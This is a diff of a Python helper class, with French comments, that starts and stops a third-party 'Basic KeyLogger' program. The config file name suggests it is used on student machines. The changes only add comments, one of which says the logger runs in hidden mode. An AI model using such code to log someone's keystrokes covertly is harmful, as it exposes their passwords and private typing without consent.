@@ -10,7 +10,7 @@ from json import load
 
 pathConfig = r".\Config_etudiant.json"
 
-#Récupérer la configuration
+#Récupérer la configuration du fichier pathConfig
 file = open(pathConfig, encoding='utf-8')
 data = load(file)
 file.close()
@@ -18,15 +18,15 @@ file.close()
 
 class GestionBKL:
     def __init__(self):
-        pass
+        pass #On ne fait rien dans l'__init__()
 
     def lancer(self):
 #        """
-#        Lance le logiciel BKL
+#        Lance le logiciel BKL en mode caché
 #        """
         chdir(r".\basicKeyLogger") #Positionner le répertoire de travaille sur celui de Basic KeyLogger
         Popen(["startHidden.exe"], shell=True)
-        chdir(r".\..")
+        chdir(r".\..") #Revenir au répertoire parent
 
     def arreter(self):
 #        """
@@ -34,4 +34,4 @@ class GestionBKL:
 #        """
         chdir(r".\basicKeyLogger") #Positionner le répertoire de travaille sur celui de Basic KeyLogger
         Popen(["stopKeyLogger.exe"], shell=True)
-        chdir(r".\..")
+        chdir(r".\..") #Revenir au répertoire parent
